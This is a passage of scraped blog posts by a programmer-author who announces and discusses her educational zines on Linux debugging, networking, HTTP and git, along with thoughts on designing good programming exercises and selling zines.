early\ndays from Linux HOWTOs. Some gave me the sense that it was impossible to\nfail. Just follow the steps. It’s all there. \n \n\n Especially if you’re doing a somewhat challenging exercise like we talked\nabout above, I think it’s nice for the author to believe in your! (and of course it’s\ncrucial that they’ve actually written the exercises so that they’re  right  and\nyou can likely do the thing!) \n\n it’s been tested \n\n I read the (great) biography  Dearie: The Remarkable Life of Julia Child \nrecently and one thing that stood out to me is that she  tested  all of the\nrecipes in Mastering the Art Of French Cooking. It took her  years  to write\nthe book and test the recipes and make sure that American home cooks actually\nhad access to all the ingredients and had the. \n\n I don’t think all cookbook authors test their recipes, but I think testing\nreally improves cookbooks. \n\n I started writing some SQL exercises (like  this prototype of one on GROUP\nBY ) a while back, and at some point I\nrealized the big thing holding me back was that I didn’t have testers! I\ncouldn’t find out if people were actually learning from them or not! \n\n This is a new thing for me because when I write blog posts I don’t test them (I\nbarely even proofread them!). I just write them and publish and people often\nlike them and that’s it! I said to  Amy Hoy \n(who is amazing) on Twitter that I didn’t understand why you have to test\nexercises if you don’t have to test blog posts and she  pointed out  that people\nhave much higher expectations for exercises than for blog posts – with the\nblog posts you maybe expect to learn 1-2 new facts, but with exercises you\nexpect to actually develop a new skill! \n\n Also, people are often investing a lot more time in exercises (especially if\nthey have to set up a dev environment or something!), so it’s extra important\nto make sure that they actually work. \n\n you won’t get stuck \n\n It’s SO EASY to get stuck on some random irrelevant point in a programming\nexercise that’s totally unrelated to the skill you’re trying to learn. For\nexample there might be an easily-avoidable mistake that you can make with the\nexercise and spend a lot of time debugging but it doesn’t actually teach you a\nlot. \n\n it’s easy to get help \n\n If you’re doing a challenging exercise, you might want to get help from your\nfriends / colleagues / the internet! \n\n Some things that can go wrong: \n\n \n None of your friends have ever heard of the thing the exercise is teaching so\nyou can’t talk about it with them \n The exercise expects you to be using the newest version of some software, but\nactually all the examples on the internet are for some older version so it’s\ndifficult to search for help even though the exercise is technically correct \n The community around the tech used in the exercise is hostile/unhelpful \n \n\n One obvious way to accomplish this is by letting people use the programming\nlanguage they’re most comfortable in, because they probably already know how to\nGoogle for help in that environment. \n\n no time-consuming setup required \n\n Installing software is boring, and a lot of programming projects require\ninstalling software! A few things that can go wrong with this (though there are a lot\nmore than this!) \n\n \n I get a compiler error when I try to install this package on my computer \n The example actually requires some very specific package versions to work\nproperly and if you don’t have those exact versions installed you get a bunch\nof cryptic errors and need to google for 3 hours to fix them \n \n\n This kind of thing is a huge waste of time and super demoralizing. And it’s not\ntrivial to avoid! If you’re trying to teach someone a specific piece of\nsoftware, often that software \n\n A few options I’ve seen or used to manage this: \n\n \n tell people what you know works (“I’ve tested this in Mac/Linux but not Windows”) \n avoid requiring any software to be installed (“just use python”) \n use Docker to run everything \n run all the code in the person’s browser (because browsers usually do about the same thing) \n use a cloud system (so everything runs on someone else’s computer). This is what I do for my  pandas cookbook , which lets you run it in Binder, this really great free service for hosting Jupyter notebooks. \n \n\n it’s easy to extend \n\n @tef has this great talk on Scratch  A million things to do with a computer!  which explains the 3 ideas of Scratch: \n\n \n low floors \n wide walls \n high ceilings \n \n\n It sucks when you start learning something and then learn that what you can do\nwith the Thing is very limited! It’s exciting when you learn something and see\n“oh, wow, there are SO MANY POSSIBILITIES, what if I did X instead?” \n\n that’s a lot of things! \n\n The criteria we arrived at: \n\n \n fun exercises \n that teach you something you care about \n that are challenging \n with clear success criteria \n that can be done quickly \n with no complicated setup \n and few hidden gotchas \n using a tech stack that’s easy for you to get help with \n where there’s a lot of room to grow \n \n\n That seems pretty hard, but it seems like a good goal to aspire to! I’m going\nto keep very slowly working on exercises! \n\n"},
{"url": "https://jvns.ca/blog/2016/07/23/a-few-sketches/", "title": "A few sketches", "content": "\n      I’ve been making a few more sketches about linux debugging tools / opinions in the last week. You can find them in  this public Dropbox folder  if you’re interested. Here’s one of them: \n\n \n\n"},
{"url": "https://jvns.ca/blog/2015/04/14/strace-zine/", "title": "A zine about strace", "content": "\n      UPDATE : this zine and more can now be found at  wizardzines.com \n\n As some of you might have heard, I wrote a zine to teach people about\nhow to debug their programs using strace a while ago! I was originally\ngoing to mail it out to people, but it turns out I’m too lazy to mail\nanything. \n\n So instead, you can download, print, fold, and staple it yourself today!\nIt should work if you print it double-sided with short edge binding on\nletter paper. Also if you print an initial master copy, you can take it\nto a copy shop and get them to make many copies for you. \n\n Give it to your friends/colleagues/students to teach them about strace!\nSend me pictures!  Tell me  what you think! <3 \n\n Here’s the pdf. Have fun.  (there’s also a  landscape version ) \n\n You can also  read it on your computer . But printing it is better! =D \n\n \n \n \n \n \n\n"},
{"url": "https://jvns.ca/blog/2017/11/25/linux-comics--zine-edition/", "title": "Linux comics: a small zine", "content": "\n     \n\n Last November, I drew a bunch of comics about Linux / computers / various systemsy things. One every\nday, about 30 of them.  ( link 1 ,  link 2 ). They’re also at  https://drawings.jvns.ca . \n\n Since then, people have been asking me to write a book. I have not yet written a book. (one day!).\nBut!  This morning I woke up and thought, “well, what would happen if I just formatted all those\ncomics from last year into a small zine that folks could print? \n\n So I put 24 comics together, ran my booklet-generating script, printed them, and voilà! A cute\nlittle zine with 24 fun comics in it! \n\n Flipping through it, I noticed a few factual errors here and there, so it’s not perfect, but I\nfigure better to have it out in the world and imperfect than on my laptop where nobody can enjoy it. \n\n get the linux comics zine! \n\n The zine is 24 comics like this: \n\n \n \n \n\n View it online \n\n Print version \n\n “so you want to be a wizard” zine \n\n In other zine news – I also have a new zine called “so you want to be a wizard”. It’s about how\nto learn hard things and get better at programming. You can  get it for free here  now if you want early access to it. \n\n \n\n a script for formatting zines \n\n I mentioned a “booklet-generating script” earlier in this post. What’s that, you ask? I have a script I’ve been using to\nformat all of my zines into booklets. It’s just 50 lines of Python (mostly argument parsing),\nnothing fancy. \n\n It took me quite a while to try to figure out how to wrangle all the PDF tools to do what I wanted,\nso here it is:  https://github.com/jvns/zine-formatter \n\n One day I have to write a love letter to  pdftk  – I’ve used pdftk to do so much pdf wrangling and\nI do not know how I would make zines without it. \n\n"},
{"url": "https://jvns.ca/blog/2016/11/27/more-linux-drawings/", "title": "More drawings about computers", "content": "\n      I’ve been making drawings about computers every day in November. Here are all\nthe ones I’ve made in the last couple of weeks.\nTheir permanent home is  drawings.jvns.ca . \n\n \n \n    \n \n \n\n \n\n \n \n    \n \n \n\n \n\n \n \n    \n \n \n\n \n\n \n \n    \n \n \n\n \n\n \n \n    \n \n \n\n \n\n \n \n    \n \n \n\n \n\n \n \n    \n \n \n\n \n\n \n \n    \n \n \n\n \n\n \n \n    \n \n \n\n \n\n \n \n    \n \n \n\n \n\n \n \n    \n \n \n\n \n\n \n \n    \n \n \n\n  Networking  \n\n I made a bunch about networking. Here they are. \n\n \n \n    \n \n \n\n \n\n \n \n    \n \n \n\n \n\n \n \n    \n \n \n\n \n\n \n \n    \n \n \n\n \n\n \n \n    \n \n \n\n \n\n \n \n    \n \n \n\n \n\n \n \n    \n \n \n\n \n\n \n \n    \n \n \n\n"},
{"url": "https://jvns.ca/blog/2016/11/10/a-few-drawings-about-linux/", "title": "A few drawings about Linux", "content": "\n      For the last few days, I’ve been doing a drawing about Linux on\n my Twitter  every day. Here they are. (more\nat  drawings.jvns.ca ) \n\n It’s been really lovely to see the response to these – some of these\n(like /proc) I’ve known about for quite a while, and it makes me really\nhappy to hear “wow, I didn’t know that! That’s really cool!” \n\n I’ll try to keep up making one a day for the rest of November. \n\n Drawing these is a fun puzzle – I can’t draw most things (a cat? forget\nit!) so I need to figure out which things are within my capabilities (a\nlighting bolt? stars? hearts? okay!) and will communicate what I want. \n\n You will probably also notice that I struggle to keep a consistent font\nweight :) I’m learning what I think looks good slowly. I’ve been using\nthis Android app called “infinite design” to make vector drawings and\nthey turn out nicer. \n\n \n   \n \n \n\n \n\n \n   \n \n \n\n \n\n \n   \n \n \n\n \n\n \n   \n \n \n\n \n\n \n   \n \n \n\n \n\n \n   \n \n \n\n \n\n \n   \n \n \n\n"},
{"url": "https://jvns.ca/blog/2018/04/16/new-perf-zine/", "title": "New zine: Profiling & tracing with perf!!", "content": "\n     \n\n \n.button2 {\n    background-color: #ff5e00;\n    display: inline-block;\n    color: white;\n    margin-bottom: 6px;\n    font-weight: normal;\n    text-align: center;\n    vertical-align: middle;\n    touch-action: manipulation;\n    cursor: pointer;\n    background-image: none;\n    border: 1px solid transparent;\n    white-space: nowrap;\n    padding: 2px 6px;\n    font-size: 14px;\n    line-height: 1.7;\n    border-radius: 2px;\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    -ms-user-select: none;\n    user-select: none;\n    align-self: flex-end;\n}\n \n\n Hello! I’m delighted to announce that today I’m releasing a new zine: Profiling & tracing with\nperf!! \n\n perf  is one of my favorite programs for profiling / tracing Linux programs and SO MANY people\ndon’t know about it and don’t know how to get started. So this zine aims to get you started and\nshow why it’s great, as usual :) \n\n \n\n Read it online! \n Get the print version!    \n \n \n \n \n \n\n how these zines are funded \n\n A quick note on funding!! I decided a while back that giving away zines 100% for free wasn’t working\nfor me. Making them is a lot of work! So I came up with a new plan. \n\n The way it works now is – when I release a new zine, I’ll put it up for sale ($10 for the PDF) if\nyou want early access. Then after 2-3 weeks or so, I’ll put it up on this website for free. I used\nto have donation links on my zines page but nobody really used them so I don’t do that anymore :) \n\n So I put this perf zine up for sale a few weeks ago, 250 of you bought early access to the zine\n(thank you!!) and I feel great about that. And today I’m releasing it for free so that everyone else\ncan read it too! \n\n"},
{"url": "https://jvns.ca/blog/2017/12/01/new-zine--so-you-want-to-be-a-wizard/", "title": "New zine: So you want to be a wizard", "content": "\n     \n\n \n\n Hello! I have a new zine for you, everyone! “So you want to be a wizard” is now available for free!\nThanks to everyone who paid for early access – all 200 of you are amazing =) \n\n As usual there is a version to read online and a print version that you can print + fold + staple\nand give to your friends. A bunch of folks have told me that they’ve given this one to newer\ndevelopers they work with which makes me happy! \n\n                                                                                                                        \n  \n \n\n                                                                                                                        \n   Read online \n   Get the print version!    \n \n\n \n\n what the zine is about \n\n Do you want to get  really good  at your job? Me too. This zine is about how I learn new things\nabout programming! It discusses: \n\n \n how to ask awesome questions \n reading the source code \n debugging skills \n how to design software \n and more! \n \n\n other news: redesigned my zines page! \n\n As part of posting this, I redesigned  https://jvns.ca/zines , the page where all my zines live.\nThings there should be better organized and easier to find. \n\n Did you know I’ve published 8 zines???? I didn’t! I was delighted to learn this. This year I made 4\nzines, it turns out. Maybe next year I will make 4 zines too! \n\n For a while I was making people download print zines with Gumroad (they were pay-what-you-want).\nI’ve decided that was a failed experiment so now all the links on the page are just normal links to\nPDFs. Much easier to use! Yay! \n\n"},
{"url": "https://jvns.ca/blog/networking-zine-launch/", "title": "New zine: \"Networking! ACK!\"", "content": "\n      HI FRIENDS. In December, I started writing a zine about computer\nnetworking! In it, I explain everything that happens when you download\n this image  from the internet, in as much\ndetail as I can fit in 24 pages. \n\n Have you been seeing cool drawings about networking concepts on Twitter\nfrom me, and wondering “Julia, I really want to have all of these\nin one place, how can I get that??“? This is what I was working on! \n\n Here’s the (amazing) cover, by rad programmer  Lee Baillie . \n\n \n \n \n\n This zine explains: \n\n \n how packets are put together \n all the steps to download a cat: DNS, sockets, TCP connections, HTTP,\nand TLS \n networking notation \n networking layers \n what even is a “port” \n and more! \n \n\n I’m really excited about this – I spent a really long time being\nconfused about how any of this networking stuff worked AT ALL, and I’m\nhoping this zine will help some people understand a few more things. \n\n Also I am worried about what is happening in the world this week, and\nI wanted to do a small thing to help. \n\n Read the networking zine today ! It’s at  https://wizardzines.com/zines/networking . \n\n"},
{"url": "https://jvns.ca/blog/2017/01/20/a-tiny-zine-about-machine-learning/", "title": "A tiny zine about machine learning", "content": "\n      The other day I gave a talk on doing machine learning in production. It was a\nshort talk at a local meetup, and I felt like trying something new. Instead\nof making slides, I wrote a short 8-page zine illustrating some concepts about\nmachine learning, printed 70 copies on my home printer (who has an awesome\nlong-arm swingline stapler? I DO!!!), and gave them out to everyone who came! \n\n There are 2 versions of it, as usual: \n\n \n a version you can read on your computer \n a version you can print and staple and fold \n \n\n If you like it, you should read the PDF that it’s based on:  Rules of Machine Learning:\nBest Practices for ML Engineering , which I found out about thanks to  Avi Bryant . \n\n I learned that: \n\n \n giving a talk without using slides  at all  is possible. It was a little weird, but I will probably experiment with it again in the future. I still like using slides though! \n I can write a short, sketchy zine in 2 hours (which is the same amount of time it takes me to write similar-quality slides!) \n I can print, staple, and fold 70 zines in 40 minutes (with some folding help from my amazing partner Kamal :)) \n giving away zines at a meetup is really fun, way more fun than being like “uh, the slides are on my website” \n \n\n Here’s the cover: \n\n \n\n"},
{"url": "https://jvns.ca/blog/2017/04/29/new-zine--let-s-learn-tcpdump/", "title": "New zine: let's learn tcpdump!", "content": "\n      \n\n tcpdump is a useful tool for seeing what network packets are being\nsent/received on a computer. I used to be really confused about tcpdump!\nI’d run tcpdump, it would print a bunch of incomprehensible output, I’d\nlook at the man page, and I’d run away. \n\n I’ve learned a lot more about it and these days, I feel really\ncomfortable with tcpdump! I’ll see a networking problem, think\n“oh, no big deal, I’ll just fire up tcpdump!”, and be one step closer to\nfiguring it out. \n\n So I decided to write a short 12-page zine to explain tcpdump basics so that\nyou too can realize “hey, this isn’t so bad!!”. \n\n I’m doing an experiment with this one where – you can buy it today for $10\n(early access!), and then I’ll release it for free on this blog a little later\non. If you’re excited about tcpdump and want to buy it and help support julia’s\nzine-making enterprises, here it is. As usual it includes both a version you\ncan read online and a version you can print out and give to your friends. \n\n \n(edit: it is now later, so all of the links have now been replaced with free links)\n \n\n \n \n \n\n \nAlso, if you’re thinking “this is cool, but I feel like I’m missing some computer networking basics”, I wrote a computer networking zine called  Networking! ACK!  for you! ( here’s the pdf ) \n\n Here’s what the cover looks like (I hired an awesome illustrator!): \n\n \n \n \n\n and the inside pages on tcpdump command line arguments, as a preview – it\nturns out there are only a few that you really need to know about! \n\n \n \n \n \n\n I’m still figuring out what the best way is to sell stuff online is. Gumroad\nseems reasonable so far but let me know if there are problems with it! \n\n"},
{"url": "https://jvns.ca/blog/2017/05/14/learn-tcpdump-zine/", "title": "\"Let's learn tcpdump\" zine: now available for everyone", "content": "\n     \n\n \n\n Hello! A couple weeks back, I wrote a zine called “let’s learn tcpdump!”\nand released the early access version for $10 as an experiment. \n\n Today, I’m releasing it for everyone! \n\n the zine \n\n If you want to read the zine now, here it is:\n \n Read the zine online! \n Get the print version! \n\n \n\n The print version is pay-what-you-can. It includes a version with an adorable\ncolour cover, if you want to print it in scintillating colour! \n\n Here’s the cover: \n\n                                                                                                                        \n  \n \n\n the experiment \n\n I did an experiment where I charged people $10 for early access to the zine!\nHere are the results: \n\n \n People seemed pretty excited to give me money for a thing (“yay! this is\nawesome! this helped me use tcpdump! thank you!“)\n( people said a bunch of nice things on twitter! ) \n 190 people bought it in all, for a total of $1970. Thank you, everyone! It\nfeels really cool that people actually think the stuff I make is worth money,\nand it makes me feel motivated to make more zines like this. And it makes it\neasier for me to do things like pay illustrators to make awesome illustrations! \n 1 person bought an “enterprise license” ($100) so that they could print it out and\ngive it out to a lot of people at their conference. \n \n\n thanks \n\n Special thanks to my friend Maya who did the lettering for the title! you are\nthe best. And to my awesome partner Kamal who always helps review my zines. \n\n And to the amazing illustrator Vladimir who made the cover! Paying artists is\nreally cool. \n\n"},
{"url": "https://jvns.ca/blog/2018/09/22/new-zine--help--i-have-a-manager/", "title": "New zine: Help! I have a manager!", "content": "\n     \n\n I just released a new zine! It’s called “Help! I have a manager!” \n\n This zine is everything I wish somebody had told me when I started out in my career and had no idea\nhow I was supposed to work with my manager. Basically I’ve learned along the way that even when I\nhave a  great  manager, there are still a lot of things I can do to make sure that we work well\ntogether, mostly around communicating clearly! So this zine is about how to do that. \n\n You can get it for $10 at  https://wizardzines.com/zines/manager . Here’s the cover and table of contents: \n\n \n \n \n \n\n The cover art is by  Deise Lino . Tons of people helped me write this\nzine – thanks to Allison, Brett, Jay, Kamal, Maggie, Marc, Marco, Maya, Will, and many others. \n\n a couple of my favorite pages from the zine \n\n I’ve been posting pages from the zine  on twitter  as I’ve been\nworking on it. Here are a couple that I think are especially useful – some tips for what even to\ntalk about in 1:1s, and how to do better at asking for feedback. \n\n \n \n \n \n\n"},
{"url": "https://jvns.ca/blog/2019/09/12/new-zine-on-http/", "title": "New zine: HTTP: Learn your browser's language!", "content": "\n     \n\n Hello! I’ve released a new zine! It’s called “HTTP: Learn your browsers language!” \n\n You can get it for $12 at  https://wizardzines.com/zines/http . If you buy it, you’ll get a PDF that you can\neither read on your computer or print out. \n\n Here’s the cover and table of contents: \n\n \n \n \n \n\n why http? \n\n I got the idea for this zine from talking to  Marco Rogers  – he\nmentioned that he thought that new web developers / mobile developers would really benefit from\nunderstanding the fundamentals of HTTP better, I thought “OOH I LOVE TALKING ABOUT HTTP”, wrote a\nfew pages about HTTP, saw they were helping people, and decided to write a whole zine about HTTP. \n\n HTTP is important to understand because it runs the entire web – if you understand how HTTP\nrequests and responses work, then it makes it WAY EASIER to debug why your web application isn’t\nworking properly. Caching, cookies, and a lot of web security are implemented using HTTP headers, so\nif you don’t understand HTTP headers those things seem kind of like impenetrable magic. But actually\nthe HTTP protocol is fundamentally pretty simple – there are a lot of complicated details but the\nbasics are pretty easy to understand. \n\n So the goal of this zine is to teach you the basics so you can easily look up and understand the\ndetails when you need them. \n\n what it looks like printed out \n\n All of my zines are best printed out (though you get a PDF you can read on your computer too!), so\nhere are a couple of pictures of what it looks like when printed. I always ask my illustrator to\nmake both a black and white version and a colour version of the cover so that it looks great when\nprinted on a black and white printer. \n\n \n \n\n (if you click on that “same origin policy” image, you can make it bigger) \n\n The zine comes with 4 print PDFs in addition to a PDF you can just read on your\ncomputer/phone: \n\n \n letter / colour \n letter / b&w \n a4 / colour \n a4 / b&w \n \n\n zines for your team \n\n You can also buy this zine for your team members at work to help them learn HTTP! \n\n I’ve been trying to get the pricing right for this for a while – I used to do it based on size of\ncompany, but that didn’t seem quite right because sometimes people would want to buy the zine for a\nsmall team at a big company. So I’ve switched to pricing based on the number of copies you want to\ndistribute at your company. \n\n Here’s the link:  zines for your team! . \n\n the tweets \n\n When I started writing zines, I would just sit down, write down the things I thought were important,\nand be done with it. \n\n In the last year and a half or so I’ve taken a different approach – instead of writing everything\nand then releasing it, instead I write a page at a time, post the page to Twitter, and then improve it and\ndecide what page to write next based on the questions/comments I get on Twitter. If someone replies\nto the tweet and asks a question that shows that what I wrote is unclear, I can improve it! (I love\ngetting replies on twitter asking clarifying questions!). \n\n Here are all the initial drafts of the pages I wrote and posted on twitter, in chronological order.\nSome of the pages didn’t make it into the zine at all, and I needed to do a lot of editing at the\nend to figure out the right order and make them all work coherently together in a zine instead of\nbeing a bunch of independent tweets. \n\n \n Jul 1:  http status codes  \n Jul 2:  anatomy of a HTTP response  \n Jul 2:  POST requests  \n Jul 2:  an example POST request  \n Jul 28:  the same origin policy  \n Jul 28:  what’s HTTP?  \n Jul 30:  the most important HTTP request headers  \n Jun 30:  anatomy of a HTTP request  \n Aug 4:  content delivery networks  \n Aug 6:  caching headers  \n Aug 6:  how cookies work  \n Aug 7:  redirects  \n Aug 8:  45 seconds on the Accept-Language HTTP header  \n Aug 9:  HTTPS: HTTP + security  \n Aug 9:  today in 45 second video experiments: the Range header  \n Aug 9:  some HTTP exercises to try  \n Aug 10:  some security headers  \n Aug 12:  using HTTP APIs  \n Aug 13:  what’s with those headers that start with x-?  \n Aug 13:  important HTTP response headers  \n Aug 14:  HTTP request methods (part 1)  \n Aug 14:  HTTP request methods (part 2)  \n Aug 15:  how URLs work  \n Aug 16:  CORS  \n Aug 19:  why the same origin policy matters  \n Aug 21:  HTTP headers  \n Aug 24:  how to learn more about HTTP  \n Aug 25:  HTTP/2  \n Aug 27:  certificates  \n \n\n Writing zines one tweet at a time has been really fun. I think it improves the quality a lot,\nbecause I get a ton of feedback along the way that I can use to make the zine better. There are also\nsome experimental 45 second tiny videos in that list, which are definitely not part of the zine, but\nwhich were fun to make and which I might expand on in the future. \n\n examplecat.com \n\n One tiny easter egg in the zine: I have a lot of examples of HTTP requests, and I wasn’t sure for a\nlong time what domain I should use for the examples. I used example.com a bunch, and google.com and\ntwitter.com sometimes, but none of those felt quite right. \n\n A couple of days before publishing the zine I finally had an epiphany – my example on the cover was\nrequesting a picture of a cat, so I registered  https://examplecat.com  which just has a single\npicture of a cat. It also has an ASCII cat if you’re browsing in your terminal. \n\n $ curl https://examplecat.com/cat.txt  -i\nHTTP/2 200 \naccept-ranges: bytes\ncache-control: public, max-age=0, must-revalidate\ncontent-length: 33\ncontent-type: text/plain; charset=UTF-8\ndate: Thu, 12 Sep 2019 16:48:16 GMT\netag: \"ac5affa59f554a1440043537ae973790-ssl\"\nstrict-transport-security: max-age=31536000\nage: 5\nserver: Netlify\nx-nf-request-id: c5060abc-0399-4b44-94bf-c481e22c2b50-1772748\n\n\\    /\\\n )  ( ')\n(  /  )\n \\(__)|\n \n\n more zines at wizardzines.com \n\n If you’re interested in the idea of programming zines and haven’t seen my zines before, I have a\nbunch more at  https://wizardzines.com . There are 6 free zines there: \n\n \n so you want to be a wizard \n let’s learn tcpdump! \n spying on your programs with strace \n networking! ACK! \n linux debugging tools you’ll love \n profiling and tracing with perf \n \n\n next zine: not sure yet! \n\n Some things I’m considering for the next zine: \n\n \n debugging skills (I started writing a bunch of pages about debugging but switched gears to the\nHTTP zine because I got really excited about that. but debugging is my favourite thing so I’d like\nto get this done at some point) \n gdb (a short zine in the spirit of  let’s learn tcpdump ) \n relational databases (what’s up with transactions?) \n \n\n"},
{"url": "https://jvns.ca/blog/2019/03/15/new-zine--bite-size-networking-/", "title": "New zine: Bite Size Networking!", "content": "\n     \n\n Last week I released a new zine: Bite Size Networking! It’s the third zine in the “bite size”\nseries: \n\n \n Bite Size Linux \n Bite Size Command Line \n Bite Size Networking \n \n\n You can get it for $10 at  https://wizardzines.com/zines/bite-size-networking/ ! (or $150/$250/$600 for\nthe corporate rate). \n\n Here’s the cover and table of contents! \n\n \n \n \n \n\n A few people have asked for a 3-pack with all 3 “bite size” zines which is coming soon! \n\n why this zine? \n\n In last few years I’ve been doing a lot of networking at work, and along the way I’ve gone from “uh,\nwhat even is tcpdump” to “yes I can just type in  sudo tcpdump -c 200 -n port 443 -i lo ” without\neven thinking twice about it. As usual this zine is the resource I wish I had 4 years ago. There are\nso many things it took me a long time to figure out how to do like: \n\n \n inspect SSL certificates \n make DNS queries \n figure out what server is using that port \n find out whether the firewall is causing you problems or not \n capture / search network traffic on a machine \n \n\n and as often happens with computers none of them are really that hard!! But the man pages for the\ntools you need to do these things are Very Long and as usual don’t differentiate between “everybody\nalways uses this option and you 10000% need to know it” and “you will never use this option it does\nnot matter”. So I spent a long time staring sadly at the tcpdump man page. \n\n the pitch for this zine is: \n\n \n It’s Thursday afternoon and your users are reporting SSL errors in production and you don’t know\nwhy. Or a HTTP header isn’t being set correctly and it’s breaking the site. Or you just got a\nnotification that your site’s SSL certificate is expiring in 2 days. Or you need to update DNS to\npoint to a new server. Or a server suddenly isn’t able to connect to a service. And networking\nmaybe isn’t your full time job, but you still need to get the problem fixed. \n \n\n Kamal (my partner) proofreads all my zines and we hit an exciting milestone with this one: this is\nthe first zine where he was like “wow, I really did not know a lot of the stuff in this zine”. This\nis of course because I’ve spent a lot more time than him debugging weird networking things,\nand when you practice something you get better at it :) \n\n a couple of example pages \n\n Here are a couple of example pages, to give you an idea of what’s in the zine: \n\n \n \n\n next thing to get better at: getting feedback! \n\n One thing I’ve realized that while I get a ton of help from people while writing these zines (I\nread probably a thousand tweets from people suggesting ideas for things to include in the zine), I\ndon’t get as much feedback from people about the final product as I’d like! \n\n I often hear positive things (“I love them!”, “thank you so much!”, “this helped me in my job!”) but\nI’d really love to hear more about which bits specifically helped the most and what didn’t make as\nmuch sense or what you would have liked to see more of. So I’ll probably be asking a few questions\nabout that to people who buy this zine! \n\n selling zines is going well \n\n When I made the switch about a year ago from “every zine I release is free” to “the old zines are\nfree but all the new ones are not free” it felt scary! It’s been startlingly totally fine and a very\npositive thing. Sales have been really good, people take the work more seriously, I can spend more\ntime on them, and I think the quality has gone up. \n\n And I’ve been doing occasional  giveaways  for\npeople who can’t afford a $10 zine, which feels like a nice way to handle “some people legitimately\ncan’t afford $10 and I would like to get them information too”. \n\n what’s next? \n\n I’m not sure yet! A few options: \n\n \n kubernetes \n more about linux concepts (bite size linux part II) \n how to do statistics using simulations \n something else! \n \n\n We’ll see what I feel most inspired by :) \n\n"},
{"url": "https://jvns.ca/blog/2017/07/09/linux-tracing-zine/", "title": "Linux tracing zine", "content": "\n      I wrote a really quick zine out of the linux tracing tools post from yesterday.\nIt’s not super fancy but here it is. It’s 12 pages, there’s a print version & a\nversion to read on your computer as usual. \n\n \n \n \n\n Get it here:  https://jvns.ca/linux-tracing-zine.pdf . \n\n There’s also a  print version . \n\n"},
{"url": "https://jvns.ca/blog/2018/08/05/new-zine--bite-size-command-line/", "title": "New zine: Bite Size Command Line!", "content": "\n     \n\n I released a new zine last week! It’s called “Bite Size Command Line”, and it’s explains the basics\nof a bunch of Unix command line tools! I learned some useful new things by writing it, and I hope\nyou do too. You can get it for $10 at  https://wizardzines.com/zines/bite-size-command-line . It’s the sequel to\n Bite Size Linux  which I released in April. \n\n If you want to get an idea of what’s in it, I’ve been posting the work-in-progress comics along the\nway on Twitter. You\ncan  see some of them on Twitter here . \n\n \n\n Here’s the table of contents: \n\n \n\n why I’m excited about this zine \n\n Originally when I started working on this, I kind of didn’t think it was that exciting – I thought\n“whatever, I know command line tools, I’ve been using Linux for 15 years”. \n\n It turns out that I learned quite a few fun new tricks! I learned about: \n\n \n bash process substitution ( diff <(ls) (ls -a) ) which lets you avoid creating temporary files \n sort -h  (“human sort”) which lets you sort the output of  du -sh  correctly \n the  w  option to ps will show all command line args, and  f  will show you a process tree (!!) \n and a bunch more nice tidbits! \n \n\n teaching the unix command line with less trial and error \n\n But I’m particularly excited about the possibility that this can help  beginners  learn Linux!\nMost command line tools have a TON of command line arguments, and it’s often hard to tell by reading\nthe man page which ones are crucial to know and which ones hardly anyone uses. I think a lot of this\nknowledge often gets passed down verbally, which makes it harder to learn if you don’t know many\ncommand line users. (if this is you,  https://tldr.sh/  is also a cool resource!) \n\n So the goal of this zine is basically to be your helpful, more experienced friend who’s been using\nthese tools for a while and can tell you which bits are the most important. \n\n"},
{"url": "https://jvns.ca/blog/2018/10/27/new-zine--oh-shit--git-/", "title": "New zine: Oh shit, git!", "content": "\n     \n\n Hello! Last week  Katie Sylor-Miller  and I released a new zine called\n“Oh shit, Git!”. It has a bunch of common git mistakes and how to fix them! I learned a surprising\nnumber of things by working on it (like what  HEAD@{2}  means, and that you can do\n my-branch-name@{2}  to see what a branch was previously pointing to, and more ways to use  git diff ) \n\n You can get it for $10 at  Oh shit, git! . Here’s the cover and table of contents: (you can click on the table of contents to make it bigger). \n\n \n \n \n \n\n why this zine? \n\n I’ve thought for a couple of years that it might be fun to write a git zine, but I had NO IDEA how\nto do it. I was in this weird place with git where, even though I know that git is really confusing,\nI felt like I’d forgotten what it was like to be confused/scared by Git. And I write most things\nfrom a place of “I was super confused by this thing just recently, let me explain it!!”. \n\n But then!! I saw that Katie Sylor-Miller had made this delightful website called  oh shit,\ngit!  explaining how to get out of common git mishaps. I thought this was\nreally brilliant because a lot of the things on that site (“oh shit, i committed to the wrong\nbranch!“) are things I remember being really scary when I was less comfortable with git! \n\n So I thought, maybe this could be useful for folks to have as a paper reference! Maybe we could make\na zine out of it! So I emailed her and she agreed to work with me. And now here it is! :D. Very\nexcited to have done a first collaboration. \n\n what’s new in the oh shit, git! zine? \n\n The zine isn’t the same as the website – we decided we wanted to add some fundamental information\nabout how Git works (what’s a commit?), because to really work with Git effectively you need to\nunderstand at least a little bit about how commits and branches work! And some of the explanations\nare improved. Probably about 50% of the material in the zine is from the website and 50% is new. \n\n a couple of example pages \n\n Here are a couple of example pages, to give you an idea of what’s in the zine: \n\n \n\n and a page on  git reflog : \n\n \n\n that might be it for zines in 2018! \n\n I’m not sure, but I don’t think I’ll write any more zines for a couple of months. So far there have\nbeen 5 (!!!) this year – perf, bite size linux, bite size command line, help! I have a manager!,\nand this one!. I’m really happy with that number and very grateful to everyone who’s supported them. \n\n ideas I have for zines right now include: \n\n \n kubernetes \n how to do statistics using programming \n ‘bite size networking’, on the 10 billion different command line tools used for different networking things \n ‘bite size linux v2’, about more core linux concepts that i didn’t get to in ‘bite size linux’ \n \n\n There’s a definite tradeoff between writing zines and blogging, and writing blog posts is really\nfun. Maybe I’ll try going back in that direction for a little. \n\n"},
{"url": "https://jvns.ca/blog/2019/10/21/print-collection-of-my-first-7-zines/", "title": "Your Linux Toolbox: a box set of my free zines", "content": "\n     \n\n About a year and a half ago,  No Starch Press  got in\ntouch with me about publishing a print box set of my zines. I have two kinds of\n zines  right now: \n\n \n 6 free zines (which are the first ones I wrote) \n 6 zines that cost $10-$12 each (the newer ones) \n \n\n This set is basically a really lovely box set of all of the free zines, plus\nBite Size Linux :). Here’s what’s in the box: \n\n \n Spying on your programs with strace \n So you want to be a wizard \n Networking! ACK! \n Let’s learn tcpdump! \n Profiling and tracing with perf \n Linux debugging tools you’ll love \n Bite Size Linux \n \n\n \n \n \n\n I’m really happy to get these zines into print, and that I can still give away\nall of the zines in the box away for free on my website – I asked them to\nwrite it into my publishing contract that I could still give them away, and\nthey did :) \n\n what it looks like \n\n Here are the front covers of the zines in the box. We got colour covers\nillustrated for all of them, done by Vladimir Kašiković. \n\n \n\n We had the idea to make the back covers a rainbow and I’m delighted about it: \n\n \n\n There’s this fun “this toolbox belongs to:” detail on the bottom: \n\n \n\n where to get it \n\n It’s in a bunch of physical bookstores, and online! Here are a bunch of links to places you could get it: 